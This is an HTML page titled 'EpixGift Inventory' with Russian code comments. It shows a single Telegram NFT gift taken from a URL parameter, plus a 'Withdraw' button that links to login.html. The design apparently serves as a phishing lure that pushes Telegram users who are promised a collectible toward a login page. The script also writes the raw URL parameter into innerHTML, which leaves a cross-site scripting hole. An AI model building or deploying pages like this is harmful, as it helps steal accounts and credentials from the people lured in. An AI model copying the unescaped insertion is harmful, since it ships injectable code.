<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift Inventory</title>
    
    <meta property="og:title" content="EpixGift Inventory">
    <meta property="og:image" content="https://t.me/i/nft/MoonPendant-40664.jpg">

    <style>
        body {
            background-color: #0e141b;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0; padding: 16px;
            overflow-x: hidden;
        }
        .header {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid #1c252f;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        .nft-card {
            background: #1c252f;
            border-radius: 16px;
            padding: 12px;
            border: 1px solid #2a3644;
            display: flex;
            flex-direction: column;
            animation: fadeIn 0.4s ease-out;
        }
        .nft-card img {
            width: 100%;
            aspect-ratio: 1/1;
            border-radius: 12px;
            margin-bottom: 10px;
            object-fit: cover;
            background: #0e141b;
        }
        .nft-title {
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 4px;
            color: #ffffff;
        }
        .nft-sub {
            font-size: 12px;
            color: #8a99a8;
            margin-bottom: 14px;
        }
        .btn-withdraw {
            background: #248bdf;
            color: white;
            text-decoration: none;
            text-align: center;
            font-size: 13px;
            font-weight: 600;
            padding: 10px 0;
            border-radius: 10px;
            transition: opacity 0.2s;
        }
        .btn-withdraw:active { opacity: 0.7; }

        .empty-state {
            display: none;
            text-align: center;
            color: #8a99a8;
            margin-top: 50%;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="header">EpixGift</div>
    
    <div class="grid" id="nft-grid"></div>
    <div id="empty-msg" class="empty-state">Your inventory is empty.</div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const grid = document.getElementById('nft-grid');
            const msg = document.getElementById('empty-msg');
            
            // Очищаем сетку перед началом (исправляет дубликаты)
            grid.innerHTML = '';

            const urlParams = new URLSearchParams(window.location.search);
            const itemID = urlParams.get('item');

            if (itemID) {
                // Создаем карточку только если есть ID
                const card = document.createElement('div');
                card.className = 'nft-card';

                const displayTitle = itemID.replace(/-/g, ' #');
                // Используем правильный путь к картинке Telegram
                const imgUrl = `https://t.me/i/nft/${itemID}.jpg`;

                card.innerHTML = `
                    <img src="${imgUrl}" alt="NFT" onerror="this.src='https://via.placeholder.com/200/1c252f/ffffff?text=NFT'">
                    <div class="nft-title">${displayTitle}</div>
                    <div class="nft-sub">Collectible</div>
                    <a href="login.html" class="btn-withdraw">Withdraw</a>
                `;
                grid.appendChild(card);
            } else {
                msg.style.display = 'block';
            }
        });
    </script>
</body>
</html>
